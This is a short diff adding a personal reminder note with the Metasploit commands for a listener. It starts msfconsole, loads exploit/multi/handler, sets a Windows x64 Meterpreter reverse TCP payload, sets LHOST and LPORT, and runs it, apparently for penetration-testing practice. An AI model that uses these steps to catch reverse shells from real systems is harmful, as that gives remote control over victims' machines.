@@ -1,0 +1,12 @@
+# Quick syntax check for when I need to do msf listener without looking at docs
+
+msfconsole 
+use exploit/multi/handler 
+set payload to the one that we are trying to recieve
+
+(in the case of the current thing im doing its:)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+set LHOST and LPORT respectively
+
+then exploit!
